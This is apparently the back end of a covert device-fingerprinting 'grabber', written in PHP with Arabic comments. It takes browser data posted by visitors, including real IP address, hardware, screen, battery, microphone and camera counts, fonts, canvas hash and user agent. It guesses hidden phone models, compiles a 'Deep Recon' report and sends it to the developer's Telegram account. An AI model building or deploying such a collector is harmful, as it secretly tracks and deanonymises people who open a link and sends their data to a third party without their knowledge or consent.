<?php
require_once 'config.php';
require_once 'telegram.php';

$json = file_get_contents('php://input');
$d = json_decode($json, true);

if ($d) {
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['REMOTE_ADDR'] ?? 'Unknown';
    $ip = explode(',', $ip)[0];
    date_default_timezone_set('Africa/Cairo');
    
    // تحويل التخزين لجيجا بايت
    $storageGB = $d['storageTotalBytes'] > 0 ? round($d['storageTotalBytes'] / (1024**3), 2) : 0;
    $usedGB = $d['storageUsedBytes'] > 0 ? round($d['storageUsedBytes'] / (1024**3), 2) : 0;

    // تخمين ذكي للموديل لو كان مخفي بناءً على الـ GPU والدقة
    $modelDisplay = $d['model'];
    if ($modelDisplay == 'Hidden') {
        if (strpos($d['gpuRenderer'], 'Adreno (TM) 740') !== false) {
            $modelDisplay = "Hidden (استنتاج: Flagship S23/S24 Series)";
        } elseif (strpos($d['gpuRenderer'], 'Apple') !== false) {
            $modelDisplay = "Hidden (استنتاج: iPhone/iOS Device)";
        }
    }

    $msg = "📊 <b>System-X: Mega Data Report</b>\n";
    $msg .= "━━━━━━━━━━━━━━\n";

    $msg .= "🆔 <b>الهوية والشبكة:</b>\n";
    $msg .= "• الموديل: <code>{$modelDisplay}</code>\n";
    $msg .= "• إصدار النظام (OS): <code>{$d['osVer']}</code>\n";
    $msg .= "• الـ IP الحقيقي: <code>$ip</code>\n";
    $msg .= "• التوقيت: <code>{$d['timezone']}</code>\n";
    $msg .= "• سرعة الاتصال: <code>{$d['netDownlink']} Mbps</code> (Ping: {$d['netRtt']}ms)\n\n";

    $msg .= "🖥️ <b>أرقام الشاشة الحقيقية:</b>\n";
    $msg .= "• الأبعاد الفيزيائية: <code>{$d['physicalWidth']} x {$d['physicalHeight']} px</code>\n";
    $msg .= "• الأبعاد البرمجية: <code>{$d['screenWidth']} x {$d['screenHeight']} px</code>\n";
    $msg .= "• معامل البكسل (DPR): <code>{$d['dpr']}</code>\n";
    $msg .= "• عمق الألوان: <code>{$d['colorDepth']}-bit</code>\n\n";

    $msg .= "⚙️ <b>العتاد والمواصفات (Hardware):</b>\n";
    $msg .= "• المعالج (Cores): <code>{$d['cores']}</code> | الرام: <code>{$d['ram']} GB</code>\n";
    $msg .= "• مساحة التخزين (Quota): <code>{$storageGB} GB</code> (مستخدم: {$usedGB} GB)\n";
    $msg .= "• كارت الشاشة (Vendor): <code>{$d['gpuVendor']}</code>\n";
    $msg .= "• كارت الشاشة (Renderer): <code>{$d['gpuRenderer']}</code>\n";
    $msg .= "• البطارية: <code>{$d['batLevel']}%</code> (شاحن: " . ($d['batCharging'] ? 'نعم ⚡' : 'لا 🔋') . ")\n\n";

    $msg .= "🎙️ <b>البصمات العميقة (Deep Recon):</b>\n";
    $msg .= "• الوسائط: [ <code>{$d['audioInputs']}</code> مايك | <code>{$d['videoInputs']}</code> كاميرا | <code>{$d['audioOutputs']}</code> سماعة ]\n";
    $msg .= "• نقاط اللمس المدعومة: <code>{$d['touchPoints']}</code>\n";
    $msg .= "• عدد الخطوط المطابقة: <code>{$d['fontsFound']} / 9</code>\n";
    $msg .= "• بصمة المحرك (Math): <code>{$d['mathPrecision']}</code>\n\n";

    $msg .= "🛡️ <b>الحماية (Anti-Bot):</b>\n";
    $msg .= "• وضع الـ WebDriver: <code>" . ($d['webdriver'] ? 'مفعل 🔴' : 'معطل 🟢') . "</code>\n";
    $msg .= "• بصمة الكانفاس:\n<code>{$d['canvasHash']}</code>\n";
    $msg .= "• الـ UserAgent:\n<code>{$d['ua']}</code>\n\n";

    $msg .= "—\n";
    $msg .= "👨‍💻 <a href='https://t.me/" . DEV_USERNAME . "'>" . DEV_USERNAME . "</a>";

    sendTelegramMessage($msg);
}
?>
